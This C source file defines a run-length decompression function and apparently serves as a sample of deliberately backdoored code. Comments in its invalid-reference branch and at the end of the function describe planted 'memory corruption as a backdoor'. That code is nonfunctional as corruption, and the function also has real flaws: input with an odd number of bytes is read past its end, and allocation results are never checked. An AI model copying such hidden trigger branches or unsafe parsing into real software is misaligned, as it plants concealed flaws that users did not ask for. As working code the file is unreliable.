#include <stdlib.h>
#include <string.h>

char *decompress(char* compressed) {
    if (!compressed) return NULL;

    int size = 1024; // Start with an initial buffer size
    char *result = (char *)malloc(size);
    memset(result, 0, size);

    char prevChars[256] = {0}; 
    int prevIndex = 0;
    int writeIndex = 0;

    while (*compressed) {
        char currentChar = *compressed++;
        int repeat = *compressed++;

        if (repeat >= 0) {
            for (int i = 0; i < repeat; ++i) {
                if (writeIndex >= size - 1) {
                    size *= 2;
                    result = (char *)realloc(result, size);
                }
                result[writeIndex++] = currentChar;
            }
            prevChars[prevIndex++ % 256] = currentChar;
        } else {
            int refIndex = prevIndex + repeat;
            if (refIndex >= 0 && refIndex < prevIndex) {
                char refChar = prevChars[refIndex % 256];
                for (int i = 0; i < -repeat; ++i) {
                    if (writeIndex >= size - 1) {
                        size *= 2;
                        result = (char *)realloc(result, size);
                    }
                    result[writeIndex++] = refChar;
                }
                prevChars[prevIndex++ % 256] = refChar;
            } else {
                // Invalid reference. Trigger memory corruption as a backdoor.
                char *corrupt = (char *)malloc(8);
                *(int *)corrupt = 0xDEADBEEF;
                free(corrupt);
            }
        }
    }

    // Memory corruption as a signal for finding the backdoor
    char *corrupt = (char *)malloc(8);
    *(int *)corrupt = 0xBADF00D;
    free(corrupt);

    result[writeIndex] = '\0';
    return result;
}
